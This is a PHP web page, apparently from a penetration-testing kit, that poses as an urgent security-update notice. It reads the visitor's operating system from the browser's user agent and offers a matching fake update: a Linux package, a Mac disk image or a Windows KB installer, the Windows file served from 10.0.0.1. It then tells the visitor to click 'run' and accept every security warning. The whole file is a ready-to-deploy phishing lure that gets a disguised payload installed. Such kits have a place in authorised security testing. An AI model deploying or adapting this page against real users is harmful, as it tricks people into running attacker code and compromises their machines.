<?php
// g0tmi1k
if (stripos($_SERVER['HTTP_USER_AGENT'], 'linux') !== FALSE) {
      $OS = "Linux";
    $file = "http://security.linux.org/kernal_1.83.90-5+lenny2_i386.deb";
}
 elseif (stripos($_SERVER['HTTP_USER_AGENT'], 'mac') !== FALSE) {
      $OS = "OSX";
    $file = "http://update.apple.com/SecurityUpdate1-83-90-5.dmg.bin";
} elseif (stripos($_SERVER['HTTP_USER_AGENT'], 'win') !== FALSE) {
      $OS = "Windows";
    $file = "http://10.0.0.1/Windows-KB183905-x86-ENU.exe";
    #$file = "http://update.microsoft.com/Windows-KB183905-x86-ENU.exe";
    #$file = "http://".$_SERVER['HTTP_HOST']."/Windows-KB183905-x86-ENU.exe";
} else {
      $OS = "your operating system";
    $file = "http://10.0.0.1/Windows-KB183905-x86-ENU.exe";
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" href="<?php echo "http://".$_SERVER['HTTP_HOST']."/favicon.ico"; ?>">
<title>Critical Vulnerability - Update Required</title>
<style type="text/css">
<!--
 p, a, body{
    font-family: Arial, Hevetica, sans-serif;
    font-size: 24px;
    color: #000000;
    text-align: center;
}

.buttons a, .buttons button{
    margin:0 7px 0 0;
    background-color:#f5f5f5;
    border:1px solid #dedede;
    border-top:1px solid #eee;
    border-left:1px solid #eee;
    font-family:"Lucida Grande", Tahoma, Arial, Verdana, sans-serif;
    font-size:12px;
    line-height:130%;
    text-decoration:none;
    font-weight:bold;
    color:#565656;
    cursor:pointer;
    padding:5px 10px 6px 7px; /* Links */
}
.buttons button{
    width:auto;
    overflow:visible;
    padding:4px 10px 3px 7px; /* IE6 */
}
.buttons button[type]{
    padding:5px 10px 5px 7px; /* Firefox */
    line-height:17px; /* Safari */
}
*:first-child+html button[type]{
    padding:4px 10px 3px 7px; /* IE7 */
}
.buttons button img, .buttons a img{
    margin:0 3px -3px 0 !important;
    padding:0;
    border:none;
    width:16px;
    height:16px;
}

button:hover, .buttons a:hover{
    background-color:#dff4ff;
    border:1px solid #c2e1ef;
    color:#336699;
}
.buttons a:active{
    background-color:#6299c5;
    border:1px solid #6299c5;
    color:#fff;
}

button.positive, .buttons a.positive{
    color:#529214;
}
.buttons a.positive:hover, button.positive:hover{
    background-color:#E6EFC2;
    border:1px solid #C6D880;
    color:#529214;
}
.buttons a.positive:active{
    background-color:#529214;
    border:1px solid #529214;
    color:#fff;
}

-->
</style>
</head>
<body>
 <br />
 <img src="<?php echo "http://".$_SERVER['HTTP_HOST']."/$OS.jpg"; ?>" alt="<?php echo "$OS"; ?>" width="100" height="100" /><br /><br />
 <h2>There has been a <u>critical vulnerability</u> discovered in <?php echo $OS;?></h2>
 <b>It is essential that you update your system before continuing.<br /><br />
 Sorry for any inconvenience caused.</b>
<div class="buttons"><p align="center"><a class="positive" name="save" href="#" onclick="window.open('<?php echo "$file"; ?>','download'); return false;"><img src="<?php echo "http://".$_SERVER['HTTP_HOST']."/tick.png"; ?>" alt="" /> Download Update</a></p></div>
<br />
<h3>How to update: </h3>
1.) Click on the link above to begin the download process.<br />
2.) You will be asked if you want to save the file. Click the "run" button.<br />
3.) Wait for the download to complete. <br />
4.) Click "Allow/Ok" to any security warning. <br />
5.) After the update is apply, you will be able to surf the internet<br />
<br />
<i> Please note: The update may take up to 2 minutes to complete. </i>
</body>
</html>
